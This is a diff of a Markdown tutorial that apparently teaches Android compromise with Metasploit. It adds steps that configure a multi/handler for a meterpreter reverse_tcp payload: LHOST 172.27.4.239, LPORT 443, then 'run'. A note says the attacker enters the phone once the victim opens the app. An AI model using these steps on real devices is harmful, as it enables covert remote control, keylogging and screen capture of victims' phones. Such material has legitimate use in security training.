@@ -79,8 +79,7 @@ In this first practice we will use msfvenom to create an application which will 
 **meterpreter: It is an advanced and versatile Metasploit shell that provides a number of features, such as the ability to migrate between different processes, load scripts and extensions at runtime, and capture keyboard and screen input.reverse_tcp: This is a type of connection in which the target machine establishes the connection back to the attacker (i.e. "reverse"), which can be useful for bypassing certain types of firewalls.*
 
 
-####
-
+#### show options
 **msf6 exploit(multi/handler) >** `show options`
 
 *Module options (exploit/multi/handler):*
@@ -111,4 +110,24 @@ View the full module info with the info, or info -d command.
 
 
 * *This command displays the options available for the currently selected module. These options can include details such as the IP address and port of the target host, the IP address and port of the local host, credentials to authenticate to the target host, and more.*
+
+
+#### listening mode
+**msf6 exploit(multi/handler) >** `set LHOST 172.27.4.239`
+**LHOST => 172.27.4.239**
+**msf6 exploit(multi/handler) >** `set LPORT 443`
+**LPORT => 443**
+**msf6 exploit(multi/handler) >** `run`
+
+>[!IMPORTANT]
+>
+>Until the Android enters the application, nothing will happen after it enters, we are in listening mode and through that action we will enter the phone
+
+
+
+* set LHOST 172.27.4.239: This command sets the LHOST (Local HOST) option, which is the IP address of the local machine (that is, the attacker's machine). This will be the IP address that the target system will try to connect to. In this case, it is set to 172.27.4.239.
+
+* set LPORT 443: This command sets the LPORT (Local PORT) option, which is the port on the local machine that will listen for incoming connections from the target system. In this case, it is set to 443, which is commonly used for secure HTTPS connections.
+
+* run: This command runs the exploit module with the configured options. In this case, the multi/handler module will start listening for incoming connections on the specified IP address and port.
 
